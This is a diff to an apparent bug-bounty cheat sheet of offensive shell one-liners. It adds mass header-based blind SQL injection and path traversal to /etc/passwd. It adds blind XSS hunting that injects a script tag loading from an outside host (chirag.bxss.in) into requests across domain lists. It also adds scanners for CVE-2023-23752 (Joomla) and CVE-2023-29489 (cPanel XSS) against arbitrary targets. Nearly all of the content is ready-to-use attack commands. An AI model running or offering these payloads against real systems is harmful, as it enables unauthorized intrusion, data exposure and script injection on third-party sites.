@@ -24,7 +24,13 @@ subfinder -d http://TARGET.com -silent -all | gau - blacklist ttf,woff,svg,png |
 ```
 findomain -t http://testphp.vulnweb.com -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli --batch --random-agent --level 1
 ```
-───────────────────────────────────────────────────────────────────────────────────────
+
+### Header-Based Blind SQL injection
+
+```
+cat domain.txt | httpx -silent -H "X-Forwarded-For: 'XOR(if(now()=sysdate(),sleep(13),0))OR" -rt -timeout 20 -mrt '>13'
+```
+────────────────────────────────────────────────────────────────────────
 
 
 
@@ -46,7 +52,7 @@ subfinder -d http://TARGET.com -silent -all | gau - blacklist ttf,woff,svg,png |
 ```
 gau http://testphp.vulnweb.com | tee -a archive 1>/dev/null && gf redirect archive | cut -f 3- -d ':' | qsreplace "https://cybertix.in" | httpx -silent -status-code -location
 ```
-───────────────────────────────────────────────────────────────────────────────────────
+────────────────────────────────────────────────────────────────────────
 
 
 
@@ -61,7 +67,7 @@ gau http://testphp.vulnweb.com | tee -a archive 1>/dev/null && gf redirect archi
 httpx -l url.txt -path "///////../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:'
 ```
 
-───────────────────────────────────────────────────────────────────────────────────────
+────────────────────────────────────────────────────────────────────────
 
 
 
@@ -79,7 +85,7 @@ httpx -l url.txt -path "///////../../../../../../etc/passwd" -status-code -mc 20
 subfinder -d HOST >> FILE; assetfinder --subs-only HOST >> FILE; amass enum -norecursive -noalts -d HOST >> FILE; subjack -w FILE -t 100 -timeout 30 -ssl -c $GOPATH/src/github.com/cybertix/subjack/fingerprints.json -v 3 >> takeover ;
 ```
 
-───────────────────────────────────────────────────────────────────────────────────────
+────────────────────────────────────────────────────────────────────────
 
 
 
@@ -90,15 +96,20 @@ subfinder -d HOST >> FILE; assetfinder --subs-only HOST >> FILE; amass enum -nor
 curl "https://TARGET.Com" | grep -oP '(https*.//|www\.)[^]*'
 ```
 
-───────────────────────────────────────────────────────────────────────────────────────
+
+────────────────────────────────────────────────────────────────────────
 
 
 
 # XSS (Cross-Site Scripting)
 
 ## Installation Requirements
-1. Katana    : https://github.com/projectdiscovery/katana
-2. Dalfox    : https://github.com/hahwul/dalfox
+1. Katana       : https://github.com/projectdiscovery/katana
+2. Dalfox       : https://github.com/hahwul/dalfox
+3. Waybackurls  : https://github.com/tomnomnom/waybackurls
+4. GF           : https://github.com/tomnomnom/gf
+5. Dalfox       : https://github.com/hahwul/dalfox
+6. HTTPX      : https://github.com/projectdiscovery/httpx
 
 
 ## OneLiner
@@ -106,7 +117,16 @@ curl "https://TARGET.Com" | grep -oP '(https*.//|www\.)[^]*'
 echo http://testphp.vulnweb.com | katana -jc -f qurl -d 5 -c 50 -kf robotstxt,sitemapxml -silent | dalfox pipe --skip-bav
 ```
 
-───────────────────────────────────────────────────────────────────────────────────────
+```
+waybackurls http://testphp.vulnweb.com | gf xss | sed 's/=.*/=/' | sort -u | tee XSS.txt && cat XSS.txt | dalfox -b http://chirag.bxss.in pipe > output.txt
+```
+
+### Blind XSS Mass Hunting
+
+```
+cat domain.txt | waybackurls | httpx -H "User-Agent: \"><script src=https://chirag.bxss.in></script>"
+```
+────────────────────────────────────────────────────────────────────────
 
 
 
@@ -120,4 +140,30 @@ echo http://testphp.vulnweb.com | katana -jc -f qurl -d 5 -c 50 -kf robotstxt,si
 ## OneLiner
 ```
 katana -u http://testphp.vulnweb.com -js-crawl -d 5 -hl -filed endpoint | anew endpoint.txt
+```
+
+────────────────────────────────────────────────────────────────────────
+
+# OneLiner for CVE-2023-23752 - 𝙅𝙤𝙤𝙢𝙡𝙖 𝙄𝙢𝙥𝙧𝙤𝙥𝙚𝙧 𝘼𝙘𝙘𝙚𝙨𝙨 𝙘𝙝𝙚𝙘𝙠 𝙞𝙣 𝙒𝙚𝙗𝙨𝙚𝙧𝙫𝙞𝙘𝙚 𝙀𝙣𝙙𝙥𝙤𝙞𝙣𝙩
+
+## Installation Requirements
+1. Subfinder  : https://github.com/projectdiscovery/subfinder
+2. HTTPX      : https://github.com/projectdiscovery/httpx
+
+## OneLiner
+```
+subfinder -d http://TARGET.COM -silent -all | httpx -silent -path 'api/index.php/v1/config/application?public=true' -mc 200
+```
+
+────────────────────────────────────────────────────────────────────────
+
+# cPanel CVE-2023-29489 XSS One-Liner
+
+## Installation Requirements
+1. Subfinder  : https://github.com/projectdiscovery/subfinder
+2. HTTPX      : https://github.com/projectdiscovery/httpx
+
+## OneLiner
+```
+subfinder -d http://example.com -silent -all | httpx -silent -ports http:80,https:443,2082,2083 -path '/cpanelwebcall/<img%20src=x%20onerror="prompt(document.domain)">aaaaaaaaaaaaaaa' -mc 400
 ```
